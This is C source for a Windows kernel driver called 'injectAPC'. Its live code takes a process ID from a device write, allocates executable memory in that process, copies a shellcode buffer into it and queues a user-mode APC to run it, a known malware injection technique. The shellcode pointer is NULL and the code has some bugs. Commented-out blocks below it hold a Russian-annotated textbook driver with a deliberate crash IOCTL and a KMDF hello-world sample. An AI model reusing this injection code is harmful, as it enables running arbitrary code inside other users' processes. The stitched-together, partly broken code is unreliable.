#include <ntifs.h>
#include <string.h>
#include <Ntstrsafe.h>
#include <windowsx.h>
#include <stdlib.h>   // For _MAX_PATH definition
#include <stdio.h>
#include <malloc.h>

#pragma comment(lib,"ntoskrnl.lib")
#pragma comment(lib,"Ntstrsafe.lib")

#define deviceName L"\\Device\\injectAPC"
#define symbolicName L"\\DosDevices\\injectAPC"

#ifndef SystemProcessAndThreadInformation
#define SystemProcessAndThreadInformation 5
#endif

#ifndef INVALID_HANDLE_VALUE
#define INVALID_HANDLE_VALUE 0xFFFFFFFF
#endif

/*exec calc.exe*/
char *shellcode = NULL;

/*
void LoadDll()
{
	HANDLE hDLL;
	LARGE_INTEGER buf = { 0 };
	OBJECT_ATTRIBUTES ofs;
	UNICODE_STRING dn;
	IO_STATUS_BLOCK State;
	//ZeroMemory(&State, sizeof(IO_STATUS_BLOCK));
	WCHAR* ch1 = L"\\??\\c:\\HookDLL.dll";
	RtlInitUnicodeString(&dn, ch1);
	InitializeObjectAttributes(&ofs, &dn, 0, 0, 0);
	NtCreateFile(&hDLL, GENERIC_READ, &ofs, &State, 0, FILE_ATTRIBUTE_NORMAL, 0, FILE_OPEN, 0, &buf, 0);
	ULONG size = ofs.Length;
	shellcode = MmAllocateNonCachedMemory(size);
	IO_STATUS_BLOCK ioStatusBlock;
	NtReadFile(hDLL, NULL, NULL, NULL, &ioStatusBlock, shellcode, size, 0, NULL);
}
*/

typedef VOID(NTAPI* PKNORMAL_ROUTINE)(
	_In_ PVOID NormalContext,
	_In_ PVOID SystemArgument1,
	_In_ PVOID SystemArgument2
	);

typedef VOID KKERNEL_ROUTINE(
	_In_ PRKAPC Apc,
	_Inout_ PKNORMAL_ROUTINE* NormalRoutine,
	_Inout_ PVOID* NormalContext,
	_Inout_ PVOID* SystemArgument1,
	_Inout_ PVOID* SystemArgument2
);

typedef KKERNEL_ROUTINE(NTAPI* PKKERNEL_ROUTINE);

typedef enum _KAPC_ENVIRONMENT
{
	OriginalApcEnvironment,
	AttachedApcEnvironment,
	CurrentApcEnvironment,
	InsertApcEnvironment
}KAPC_ENVIRONMENT, * PKAPC_ENVIRONMENT;

typedef struct _SYSTEM_THREAD_INFORMATION
{
	LARGE_INTEGER KernelTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER CreateTime;
	ULONG WaitTime;
	PVOID StartAddress;
	CLIENT_ID ClientId;
	KPRIORITY Priority;
	LONG BasePriority;
	ULONG ContextSwitches;
	ULONG ThreadState;
	KWAIT_REASON WaitReason;
}SYSTEM_THREAD_INFORMATION, * PSYSTEM_THREAD_INFORMATION;


NTSTATUS ZwQuerySystemInformation(ULONG InfoClass, PVOID Buffer, ULONG Length, PULONG ReturnLength);
LPSTR PsGetProcessImageFileName(PEPROCESS Process);

typedef VOID(NTAPI* PKRUNDOWN_ROUTINE)(
	_In_ PRKAPC Apc
	);

NTKERNELAPI
	void NTAPI KeInitializeApc(
	PRKAPC Apc,
	PRKTHREAD Thread,
	KAPC_ENVIRONMENT Environment,
	PKKERNEL_ROUTINE KernelRoutine,
	PKRUNDOWN_ROUTINE RundownRoutine,
	PKNORMAL_ROUTINE NormalRoutine,
	KPROCESSOR_MODE ProcessorMode,
	PVOID NormalContext
);


BOOLEAN KeInsertQueueApc(
	PRKAPC Apc,
	PVOID SystemArgument1,
	PVOID SystemArgument2,
	KPRIORITY Increment
);

typedef void* LPVOID;
typedef unsigned long int DWORD;

typedef struct _SYSTEM_PROCESS_INFORMATION
{
	ULONG NextEntryOffset;
	ULONG NumberOfThreads;
	LARGE_INTEGER WorkingSetPrivateSize;
	ULONG HardFaultCount;
	ULONG NumberOfThreadsHighWatermark;
	ULONGLONG CycleTime;
	LARGE_INTEGER CreateTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER KernelTime;
	UNICODE_STRING ImageName;
	KPRIORITY BasePriority;
	HANDLE UniqueProcessId;
	HANDLE InheritedFromUniqueProcessId;
	ULONG HandleCount;
	ULONG SessionId;
	ULONG_PTR UniqueProcessKey;
	SIZE_T PeakVirtualSize;
	SIZE_T VirtualSize;
	ULONG PageFaultCount;
	SIZE_T PeakWorkingSetSize;
	SIZE_T WorkingSetSize;
	SIZE_T QuotaPeakPagedPoolUsage;
	SIZE_T QuotaPagedPoolUsage;
	SIZE_T QuotaPeakNonPagedPoolUsage;
	SIZE_T QuotaNonPagedPoolUsage;
	SIZE_T PagefileUsage;
	SIZE_T PeakPagefileUsage;
	SIZE_T PrivatePageCount;
	LARGE_INTEGER ReadOperationCount;
	LARGE_INTEGER WriteOperationCount;
	LARGE_INTEGER OtherOperationCount;
	LARGE_INTEGER ReadTransferCount;
	LARGE_INTEGER WriteTransferCount;
	LARGE_INTEGER OtherTransferCount;
	SYSTEM_THREAD_INFORMATION Threads[1];
}SYSTEM_PROCESS_INFORMATION, * PSYSTEM_PROCESS_INFORMATION;


/*************************************ENTRY/UNLOAD****************************************/
NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDeviceObject, IN PUNICODE_STRING RegistryPath);
void UnloadRoutine(IN PDRIVER_OBJECT pDeviceObject);
/*****************************************************************************************/

/**************************************CTL DISPATCHER*************************************/
NTSTATUS CtlDriverDispatch(IN PDEVICE_OBJECT pDeviceObject, IN PIRP Irp);
NTSTATUS CtlDriverDispatchWrite(IN PDEVICE_OBJECT pDeviceObject, IN PIRP);
NTSTATUS CtlDriverDispatchRead(IN PDEVICE_OBJECT pDeviceObject, IN PIRP);
NTSTATUS CtlCreate(IN PDEVICE_OBJECT pDeviceObject, IN PIRP);
NTSTATUS CtlClose(IN PDEVICE_OBJECT pDeviceObject, IN PIRP);
/**********************************************************************************/


/*************************GLOBAL VAR**************************/
UNICODE_STRING	SymbolicLinkName;
PDEVICE_OBJECT deviceObject;

void APCKernelRoutine(
	IN PKAPC            pKAPC,
	IN PKNORMAL_ROUTINE pUserAPC,
	IN PVOID            pContext,
	IN PVOID            pSysArg1,
	IN PVOID            pSysArg2
)
{

	DbgPrint("APC Kernel Routine Entered\n");
	ExFreePool(pKAPC);
	return;
}

DWORD InsertApc(PEPROCESS eProcess, LPVOID shellcode_, DWORD shellcodeSize)
{
	PSYSTEM_PROCESS_INFORMATION processInfo;
	LPVOID processInformaionBuffer;
	PKAPC_STATE ApcState;
	PKAPC apc;
	DWORD size = 0;
	PETHREAD eThread = NULL;
	LPVOID memory = NULL;
	NTSTATUS status = INVALID_HANDLE_VALUE;
	DWORD ApcStateOffset = 0x40;

	DWORD pid = (DWORD)PsGetProcessId(eProcess);
	if (pid)
	{
		status = ZwQuerySystemInformation(SystemProcessAndThreadInformation, NULL, 0, &size);
		if (status == STATUS_INFO_LENGTH_MISMATCH)
		{
			processInformaionBuffer = ExAllocatePool(NonPagedPool, size);
			status = ZwQuerySystemInformation(SystemProcessAndThreadInformation, processInformaionBuffer, size, NULL);
			if (processInformaionBuffer && NT_SUCCESS(status))
			{
				processInfo = (PSYSTEM_PROCESS_INFORMATION)processInformaionBuffer;

				while (processInfo->NextEntryOffset)
				{
					if ((DWORD)processInfo->UniqueProcessId == pid)
					{
						DbgPrint("Process name: %s\n", PsGetProcessImageFileName(eProcess));
						status = PsLookupThreadByThreadId(processInfo->Threads[0].ClientId.UniqueThread, &eThread);
						if (NT_SUCCESS(status))
						{
							DbgPrint("Thread has been found!: 0x%08x, id: %d", eThread, PsGetThreadId(eThread));
							KeAttachProcess(eProcess);
							status = ZwAllocateVirtualMemory(NtCurrentProcess(), &memory, 0, &size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
							if (NT_SUCCESS(status))
							{
								// Set KAPC_STATE.UserApcPending on.	
								//+0x040 ApcState         : _KAPC_STATE in _KTHREAD
								// +0x016 UserApcPending   : UChar in _KAPC_STATE
								*((unsigned char*)eThread + 0x40 + 0x16) = 1;

								DbgPrint("Allocated memory for shellcode!: 0x%08x", memory);
								memcpy(memory, shellcode_, shellcodeSize);
								apc = (PKAPC)ExAllocatePool(NonPagedPool, sizeof(KAPC));
								if (apc)
								{
									RtlZeroMemory(apc, sizeof(KAPC));
									KeInitializeApc(apc,
										eThread,
										OriginalApcEnvironment,
										(PKKERNEL_ROUTINE)APCKernelRoutine,
										NULL,
										(PKNORMAL_ROUTINE)memory,		//shell code
										UserMode,
										&size);
									status = KeInsertQueueApc(apc, NULL, NULL, 0);
									//ObDereferenceObject(eThread);
									//ObDereferenceObject(eProcess);									
									DbgPrint("It Done!\n");
								}

							}
							ZwFreeVirtualMemory(NtCurrentProcess(), memory, &size, MEM_RELEASE);
							KeDetachProcess();
						}

					}
					processInfo = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)processInfo + processInfo->NextEntryOffset);
				}
			}
			ExFreePool(processInformaionBuffer);
		}
	}
	return status;
}

NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDeviceObject, IN PUNICODE_STRING RegistryPath)
{
	NTSTATUS status;
	UNICODE_STRING	DeviceName;
	PDRIVER_DISPATCH* pDispacher;
	DWORD pid = 0;
	PEPROCESS process = NULL;

	RtlInitUnicodeString(&DeviceName, deviceName);
	RtlInitUnicodeString(&SymbolicLinkName, symbolicName);

	status = IoCreateDevice(pDeviceObject, 0, &DeviceName, FILE_DEVICE_NULL, 0, FALSE, &deviceObject);
	if (status == STATUS_SUCCESS)
	{
		status = IoCreateSymbolicLink(&SymbolicLinkName, &DeviceName);

		pDispacher = pDeviceObject->MajorFunction;
		pDeviceObject->DriverUnload = UnloadRoutine;

		pDispacher[IRP_MJ_DEVICE_CONTROL] = CtlDriverDispatch;
		pDispacher[IRP_MJ_WRITE] = CtlDriverDispatchWrite;
		pDispacher[IRP_MJ_READ] = CtlDriverDispatchRead;
		pDispacher[IRP_MJ_CREATE] = CtlCreate;
		pDispacher[IRP_MJ_CLOSE] = CtlClose;

		DbgPrint("driver loaded!\n");
		return status;
	}
	DbgPrint("driver not loaded!");
	return status;
}

void UnloadRoutine(IN PDRIVER_OBJECT pDeviceObject)
{
	NTSTATUS status;
	status = IoDeleteSymbolicLink(&SymbolicLinkName);
	if (status == STATUS_SUCCESS) {
		IoDeleteDevice(deviceObject);
		DbgPrint("driver has been unloaded!\n");
		return;
	}
	DbgPrint("driver has`t been unloaded!");
}

NTSTATUS CtlDriverDispatch(IN PDEVICE_OBJECT pDeviceObject, IN PIRP Irp)
{
	Irp->IoStatus.Information = 0;
	Irp->IoStatus.Status = STATUS_SUCCESS;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}

NTSTATUS CtlDriverDispatchWrite(IN PDEVICE_OBJECT pDeviceObject, IN PIRP Irp)
{
	PIO_STACK_LOCATION pIrpStack;
	DWORD pid;
	PEPROCESS process;

	pIrpStack = IoGetCurrentIrpStackLocation(Irp);
	Irp->IoStatus.Information = 0;
	DbgPrint("Write!\n");
	if (pIrpStack->MajorFunction == IRP_MJ_WRITE)
	{
		__try
		{
			ULONG Length = pIrpStack->Parameters.Write.Length;


			memcpy(&pid, Irp->UserBuffer, sizeof(DWORD));
			DbgPrint("pid:%d \n", pid);

			if (PsLookupProcessByProcessId((HANDLE)pid, &process) == STATUS_SUCCESS)
			{
				//LoadDll();
				DbgPrint("process: %s, pid: %d, _EPROCESS: 0x%08x\n", PsGetProcessImageFileName(process), pid, process);
				if (process)
					InsertApc(process, shellcode, sizeof(shellcode));
			}
		}
		__except (EXCEPTION_EXECUTE_HANDLER)
		{
			DbgPrint("Error CtlDriverDispatchWrite");
		}
	}

	Irp->IoStatus.Status = STATUS_SUCCESS;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}

NTSTATUS CtlDriverDispatchRead(IN PDEVICE_OBJECT pDeviceObject, IN PIRP Irp)
{
	Irp->IoStatus.Information = 0;
	Irp->IoStatus.Status = STATUS_SUCCESS;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}

NTSTATUS CtlCreate(IN PDEVICE_OBJECT pDeviceObject, IN PIRP Irp)
{
	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}

NTSTATUS CtlClose(IN PDEVICE_OBJECT pDeviceObject, IN PIRP Irp)
{
	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}

// Солдатов
/*
/////////////////////////////////////////////////////////////////////
// init.cpp: Инициализация драйвера
// Замечание. Рабочая версия данного драйвера должна быть
// скомпилирована как не-WDM версия. В противном случае - драйвер
// не сможет корректно загружаться и выгружаться с использованием
// программы monitor (пакет Numega Driver Studio) и сервисов SCM
// Менеджера.

/////////////////////////////////////////////////////////////////////
// DriverEntry	          Главная точка входа в драйвер
// UnloadRoutine          Процедура выгрузки драйвера
// DeviceControlRoutine   Обработчик DeviceIoControl IRP пакетов
/////////////////////////////////////////////////////////////////////
#include "Driver.h"

// Предварительные объявления функций:
NTSTATUS DeviceControlRoutine(IN PDEVICE_OBJECT fdo, IN PIRP Irp);
VOID     UnloadRoutine(IN PDRIVER_OBJECT DriverObject);
NTSTATUS ReadWrite_IRPhandler(IN PDEVICE_OBJECT fdo, IN PIRP Irp);
NTSTATUS Create_File_IRPprocessing(IN PDEVICE_OBJECT fdo, IN PIRP Irp);
NTSTATUS Close_HandleIRPprocessing(IN PDEVICE_OBJECT fdo, IN PIRP Irp);

// Хотя и нехорошо делать глобальные переменные в драйвере...
KSPIN_LOCK MySpinLock;

#pragma code_seg("INIT") // начало секции INIT
/////////////////////////////////////////////////////////////////////
// (Файл init.cpp)
// DriverEntry - инициализация драйвера и необходимых объектов
// Аргументы:  указатель на объект драйвера
//             раздел реестра (driver service key) в UNICODE
// Возвращает: STATUS_Xxx

NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject,
	IN PUNICODE_STRING RegistryPath)
{
	NTSTATUS status = STATUS_SUCCESS;
	PDEVICE_OBJECT  fdo;
	UNICODE_STRING  devName;

#if DBG
	DbgPrint("=Example= In DriverEntry.");
	DbgPrint("=Example= RegistryPath = %ws.", RegistryPath->Buffer);
#endif

	// Экспорт точек входа в драйвер (AddDevice объявлять не будем)
	// DriverObject->DriverExtension->AddDevice= OurAddDeviceRoutine;
	DriverObject->DriverUnload = UnloadRoutine;
	DriverObject->MajorFunction[IRP_MJ_CREATE] = Create_File_IRPprocessing;
	DriverObject->MajorFunction[IRP_MJ_CLOSE] = Close_HandleIRPprocessing;
	DriverObject->MajorFunction[IRP_MJ_READ] = ReadWrite_IRPhandler;
	DriverObject->MajorFunction[IRP_MJ_WRITE] = ReadWrite_IRPhandler;
	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DeviceControlRoutine;
	//========================================================
	// Действия по созданию символьной ссылки
	// (их нужно было бы делать в OurAddDeviceRoutine, но у нас
	// очень простой драйвер и эта процедура отсутствует):
	RtlInitUnicodeString(&devName, L"\\Device\\EXAMPLE");

	// Создаем наш Functional Device Object (FDO) и получаем
	// указатель на созданный FDO в нашей переменной fdo.
	// (В WDM драйвере эту работу также следовало бы выполнять
	// в процедуре OurAddDeviceRoutine.) При создании FDO
	// будет выделено место и под структуру расширения устройства
	// EXAMPLE_DEVICE_EXTENSION (для этого мы передаем в вызов
	// ее размер, вычисляемый оператором sizeof):
	status = IoCreateDevice(DriverObject,
		sizeof(EXAMPLE_DEVICE_EXTENSION),
		&devName, // может быть и NULL
		FILE_DEVICE_UNKNOWN,
		0,
		FALSE, // без эксклюзивного доступа
		&fdo);
	if (!NT_SUCCESS(status)) return status;

	// Получаем указатель на область, предназначенную под
	// структуру расширение устройства
	PEXAMPLE_DEVICE_EXTENSION dx = (PEXAMPLE_DEVICE_EXTENSION)fdo->DeviceExtension;
	dx->fdo = fdo;  // Сохраняем обратный указатель

	// Применяя прием условной компиляции, вводим функцию DbgPrint,
	// сообщения которой мы сможем увидеть в окне DebugView, если
	// выполним сборку нашего драйвера как checked (отладочную)
	// версию:
#if DBG
	DbgPrint("=Example= FDO %X, DevExt=%X.", fdo, dx);
#endif

	//=======================================
	// Действия по созданию символьной ссылки
	// (их нужно было бы делать в OurAddDeviceRoutine, но у нас
	// очень простой драйвер):
	UNICODE_STRING symLinkName;   // Сформировать символьное имя:
	// #define   SYM_LINK_NAME   L"\\??\\Example"
	// Такого типа символьные ссылки ^^ проходят только в NT.
	// (То есть, если перенести бинарный файл драйвера в
	// Windows 98, то пользовательские приложения заведомо
	// не смогут открыть файл по такой символьной ссылке.)
	// Для того, чтобы ссылка работала в и Windows 98 и в NT,
	// необходимо поступать следующим образом:
#define	SYM_LINK_NAME	L"\\DosDevices\\Example"
	RtlInitUnicodeString(&symLinkName, SYM_LINK_NAME);
	dx->ustrSymLinkName = symLinkName;

	// Создаем символьную ссылку
	status = IoCreateSymbolicLink(&symLinkName, &devName);
	if (!NT_SUCCESS(status))
	{ // при неудаче √ удалить Device Object и вернуть управление
		IoDeleteDevice(fdo);
		return status;
	} // Теперь можно вызывать CreateFile("\\\\.\\Example",...);
	  // в пользовательских приложениях

	// Объект спин-блокировки, который будем использовать для
	// разнесения во времени выполнения кода обработчика
	// IOCTL запросов. Инициализируем его:
	KeInitializeSpinLock(&MySpinLock);

	// Снова используем условную компиляцию, чтобы выделить код,
	// компилируемый в отладочной версии и не компилируемый в
	// версии free (релизной):
#if DBG
	DbgPrint("=Example= DriverEntry successfully completed.");
#endif
	return status;
}
#pragma code_seg() // end INIT section

// (Файл init.cpp)
// CompleteIrp: Устанавливает IoStatus и завершает обработку IRP
// Первый аргумент - указатель на объект нашего FDO.
//
NTSTATUS CompleteIrp(PIRP Irp, NTSTATUS status, ULONG info)
{
	Irp->IoStatus.Status = status;
	Irp->IoStatus.Information = info;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return status;
}

//
// (Файл init.cpp)
// ReadWrite_IRPhandler: Берет на себя обработку запросов
// чтения/записи и завершает обработку IRP вызовом CompleteIrp
// с числом переданных/полученных байт (BytesTxd) равным нулю.
// Аргументы:
// Указатель на объект нашего FDO
// Указатель на структуру IRP, поступившего от Диспетчера ввода/вывода
NTSTATUS ReadWrite_IRPhandler(IN PDEVICE_OBJECT fdo, IN PIRP Irp)
{
	ULONG BytesTxd = 0;
	NTSTATUS status = STATUS_SUCCESS; //Завершение с кодом status
	// Задаем печать отладочных сообщений √ если сборка отладочная
#if DBG
	DbgPrint("-Example- in ReadWrite_IRPhandler.");
#endif
	return CompleteIrp(Irp, status, BytesTxd);
}

//
// (Файл init.cpp)
// Create_File_IRPprocessing: Берет на себя обработку запросов с
// кодом IRP_MJ_CREATE.
// Аргументы:
// Указатель на объект нашего FDO
// Указатель на структуру IRP, поступившего от Диспетчера ВВ
//
NTSTATUS Create_File_IRPprocessing(IN PDEVICE_OBJECT fdo, IN PIRP Irp)
{
	PIO_STACK_LOCATION IrpStack = IoGetCurrentIrpStackLocation(Irp);
	// Задаем печать отладочных сообщений - если сборка отладочная
#if DBG
	DbgPrint("-Example- Create File is %ws",
		&(IrpStack->FileObject->FileName.Buffer));
#endif
	return CompleteIrp(Irp, STATUS_SUCCESS, 0); // Успешное завершение
}


// (Файл init.cpp)
// Close_File_IRPprocessing: Берет на себя обработку запросов с
// кодом IRP_MJ_CLOSE.
// Аргументы:
// Указатель на объект нашего FDO
// Указатель на структуру IRP, поступившего от Диспетчера ввода/вывода
NTSTATUS Close_HandleIRPprocessing(IN PDEVICE_OBJECT fdo, IN PIRP Irp)
{
#if DBG
	// Задаем печать отладочных сообщений - если сборка отладочная
	DbgPrint("-Example- In Close handler.");
#endif
	return CompleteIrp(Irp, STATUS_SUCCESS, 0);// Успешное завершение
}


// (Файл init.cpp)
// DeviceControlRoutine: обработчик IRP_MJ_DEVICE_CONTROL запросов
// Аргументы:
// Указатель на объект нашего FDO
// Указатель на структуру IRP, поступившего от Диспетчера ВВ
//	Возвращает:  STATUS_XXX
// #define SMALL_VERSION
// В том случае, если не закомментировать верхнюю строчку √ будет
// выполнена компиляция версии, в которой будет обрабатываться только
// один тип IOCTL запросов -- IOCTL_MAKE_SYSTEM_CRASH

NTSTATUS DeviceControlRoutine(IN PDEVICE_OBJECT fdo, IN PIRP Irp)
{
	NTSTATUS status = STATUS_SUCCESS;
	ULONG BytesTxd = 0; // Число переданных/полученных байт (пока 0)
	PIO_STACK_LOCATION IrpStack = IoGetCurrentIrpStackLocation(Irp);

	// Получаем указатель на расширение устройства
	PEXAMPLE_DEVICE_EXTENSION dx =
		(PEXAMPLE_DEVICE_EXTENSION)fdo->DeviceExtension;
	//-------------------------------
	// Выделяем из IRP собственно значение IOCTL кода, по поводу
	// которого случился вызов:
	ULONG ControlCode =
		IrpStack->Parameters.DeviceIoControl.IoControlCode;
	ULONG method = ControlCode & 0x03;

	// Получаем текущее значение уровня IRQL √ приоритета,
	// на котором выполняется поток (вообще говоря, целое число):
	KIRQL irql,
		currentIrql = KeGetCurrentIrql();

#if DBG
	DbgPrint("-Example- In DeviceControlRoutine (fdo= %X)\n", fdo);
	DbgPrint("-Example- DeviceIoControl: IOCTL %x.", ControlCode);
	if (currentIrql == PASSIVE_LEVEL)
		DbgPrint("-Example- PASSIVE_LEVEL (val=%d)", currentIrql);
#endif
	// Запрашиваем владение объектом спин-блокировки. В данном
	// примере не выполняется никаких критичных действий, но,
	// вообще говоря, этот прием может быть полезен и даже
	// незаменим, если в приведенном ниже коде должны будут
	// выполнены манипуляции, которые можно делать только
	// эксклюзивно. Пока потоку выделен объект спин-блокировки √
	// никакой другой поток не сможет войти в оператор switch:
	KeAcquireSpinLock(&MySpinLock, &irql);

	// Диспетчеризация по IOCTL кодам:
	switch (ControlCode) {

#ifndef SMALL_VERSION
	case IOCTL_PRINT_DEBUG_MESS:
	{     // Только вводим сообщение и только в отладочной версии
#if DBG
		DbgPrint("-Example- IOCTL_PRINT_DEBUG_MESS.");
#endif
		break;
	}
	case IOCTL_CHANGE_IRQL:
	{
#if DBG
		// Эксперименты по искусственному повышению
		// IRQL √ только в отладочной версии!
		DbgPrint("-Example- IOCTL_CHANGE_IRQL.");
		KIRQL dl = DISPATCH_LEVEL, // только для распечатки (2)
			oldIrql,
			newIrql = 25; // Новый уровень IRQL (например, 25)
			// Устанавливаем newIrql, сохраняя текущий в oldIrql:
		KeRaiseIrql(newIrql, &oldIrql);
		newIrql = KeGetCurrentIrql(); // Что реально получили?

		DbgPrint("-Example- DISPATCH_LEVEL value =%d", dl);
		DbgPrint("-Example- IRQLs are old=%d new=%d",
			oldIrql, newIrql);
		KeLowerIrql(oldIrql); // Возвращаем старое значение
#endif
		break;
	}
#endif // SMALL_VERSION


	case IOCTL_MAKE_SYSTEM_CRASH:
	{
		int errDetected = 0;
		char x = (char)0xFF;

#if	DBG  // Вообще говоря, под NT мы этого уже не увидим:
		DbgPrint("-Example- IOCTL_MAKE_SYSTEM_CRASH.");
#endif
		// Вызываем системный сбой обращением по нулевому адресу
		__try {
			x = *(char*)0x0L; // ошибочная ситуация
				//^^^^^^^^^^^^ здесь случится сбой NT, но не Win98
		}
		__except (EXCEPTION_EXECUTE_HANDLER)
		{   // Перехват исключения не работает!
			// Эта занимательная ситуация объяснена в 10.2.6,
			// при рассмотрении объектов спин-блокировок.
			errDetected = 1;
		};
#if DBG
		DbgPrint("-Example- Value of x is %X.", x);
		if (errDetected)
			DbgPrint("-Example- Except detected in Example driver.");
#endif
		break;
	}

#ifndef SMALL_VERSION
	case IOCTL_TOUCH_PORT_378H:
	{
		unsigned short ECRegister = 0x378 + 0x402;
#if DBG
		DbgPrint("-Example- IOCTL_TOUCH_PORT_378H.");
#endif
		// Пробуем программно перевести параллельный порт 378,
		// сконфигурированный средствами BIOS как ECP+EPP, в
		// режим EPP.
		_asm {
			mov dx, ECRegister;
			xor al, al;
			out dx, al;    Установить EPP mode 000
				mov al, 095h;    Биты 7:5 = 100
				out dx, al;    Установить EPP mode 100
		}
		// Подобные действия в приложении пользовательского
		// режима под NT  обязательно привело бы к аварийной
		// выгрузке приложения с сообщением об ошибке!
		// Практически эти пять строк демонстрируют, что можно
		// работать с LPT портом под Windows NT !
		break;
	}

	case IOCTL_SEND_BYTE_TO_USER:
	{
		// Размер данных, поступивших от пользователя:
		ULONG InputLength = //только лишь для примера
			IrpStack->Parameters.DeviceIoControl.InputBufferLength;
		// Размер буфера для данных, ожидаемых пользователем
		ULONG OutputLength =
			IrpStack->Parameters.DeviceIoControl.OutputBufferLength;
#if DBG
		DbgPrint("-Example- Buffer outlength %d", OutputLength);
#endif

		if (OutputLength < 1)
		{// Если не предоставлен буфер √ завершить IRP с ошибкой
			status = STATUS_INVALID_PARAMETER;
			break;
		}
		UCHAR* buff; // unsigned char, привыкаем к новой нотации
		if (method == METHOD_BUFFERED)
		{
			buff = (PUCHAR)Irp->AssociatedIrp.SystemBuffer;
#if DBG
			DbgPrint("-Example- Method : BUFFERED.");
#endif
		}
		else
			if (method == METHOD_NEITHER)
			{
				buff = (unsigned char*)Irp->UserBuffer;
#if DBG
				DbgPrint("-Example- Method : NEITHER.");
#endif
			}
			else
			{
#if DBG
				DbgPrint("-Example- Method : unsupported.");
#endif
				status = STATUS_INVALID_DEVICE_REQUEST;
				break;
			}
#if DBG
		DbgPrint("-Example- Buffer address is %08X", buff);
#endif
		* buff = 33;     // Любимое число Штирлица
		BytesTxd = 1; // Передали 1 байт
		break;
	}
#endif // SMALL_VERSION
	// Ошибочный запрос (код IOCTL, который не обрабатывается):
	default: status = STATUS_INVALID_DEVICE_REQUEST;
	}
	// Освобождение спин-блокировки
	KeReleaseSpinLock(&MySpinLock, irql);

#if DBG
	DbgPrint("-Example- DeviceIoControl: %d bytes written.", (int)BytesTxd);
#endif

	return CompleteIrp(Irp, status, BytesTxd); // Завершение IRP
}


//
// (Файл init.cpp)
// UnloadRoutine: Выгружает драйвер, освобождая оставшиеся объекты
// Вызывается системой, когда необходимо выгрузить драйвер.
// Как и процедура AddDevice, регистрируется иначе чем
// все остальные рабочие процедуры и не получает никаких IRP.
// Arguments:  указатель на объект драйвера
//

#pragma code_seg("PAGE")
// Допускает размещение в странично организованной памяти
//
VOID UnloadRoutine(IN PDRIVER_OBJECT pDriverObject)
{
	PDEVICE_OBJECT	pNextDevObj;
	int i;

	// Задаем печать отладочных сообщений √ если сборка отладочная
#if DBG
	DbgPrint("-Example- In Unload Routine.");
#endif
	//==========================================================
	// Нижеприведенные  операции в полномасштабном WDM драйвере
	// следовало бы поместить в обработчике IRP_MJ_PNP запросов
	// с субкодом IRP_MN_REMOVE_DEVICE, но в силу простоты
	// драйвера, сделаем это здесь.
	// Проходим по всем объектам устройств, контролируемым
	// драйвером
	pNextDevObj = pDriverObject->DeviceObject;

	for (i = 0; pNextDevObj != NULL; i++)
	{
		PEXAMPLE_DEVICE_EXTENSION dx =
			(PEXAMPLE_DEVICE_EXTENSION)pNextDevObj->DeviceExtension;
		// Удаляем символьную ссылку и уничтожаем FDO:
		UNICODE_STRING* pLinkName = &(dx->ustrSymLinkName);
		// !!! сохраняем указатель:
		pNextDevObj = pNextDevObj->NextDevice;

#if DBG
		DbgPrint("-Example- Deleted device (%d) : pointer to FDO = %X.",
			i, dx->fdo);
		DbgPrint("-Example- Deleted symlink = %ws.", pLinkName->Buffer);
#endif

		IoDeleteSymbolicLink(pLinkName);
		IoDeleteDevice(dx->fdo);
	}
}
#pragma code_seg() // end PAGE section
*/


/*
#include <ntddk.h>
#include <wdf.h>

DRIVER_INITIALIZE DriverEntry;
EVT_WDF_DRIVER_DEVICE_ADD KmdfHelloWorldEvtDeviceAdd;

NTSTATUS
DriverEntry(
	_In_ PDRIVER_OBJECT     DriverObject,
	_In_ PUNICODE_STRING    RegistryPath
)
{
	// NTSTATUS variable to record success or failure
	NTSTATUS status = STATUS_SUCCESS;

	// Allocate the driver configuration object
	WDF_DRIVER_CONFIG config;

	DbgPrint("**********DriverEntry POINT**********\n");

	// Initialize the driver configuration object to register the
	// entry point for the EvtDeviceAdd callback, KmdfHelloWorldEvtDeviceAdd
	WDF_DRIVER_CONFIG_INIT(&config,
		KmdfHelloWorldEvtDeviceAdd
	);

	// Finally, create the driver object
	status = WdfDriverCreate(DriverObject,
		RegistryPath,
		WDF_NO_OBJECT_ATTRIBUTES,
		&config,
		WDF_NO_HANDLE
	);
	return status;
}

NTSTATUS
KmdfHelloWorldEvtDeviceAdd(
	_In_    WDFDRIVER       Driver,
	_Inout_ PWDFDEVICE_INIT DeviceInit
)
{
	// We're not using the driver object,
	// so we need to mark it as unreferenced
	UNREFERENCED_PARAMETER(Driver);

	NTSTATUS status;

	// Allocate the device object
	WDFDEVICE hDevice;

	// Print "Hello World"
	DbgPrint("**********DeviceAdd POINT**********\n");

	// Create the device object
	status = WdfDeviceCreate(&DeviceInit,
		WDF_NO_OBJECT_ATTRIBUTES,
		&hDevice
	);
	return status;
}
*/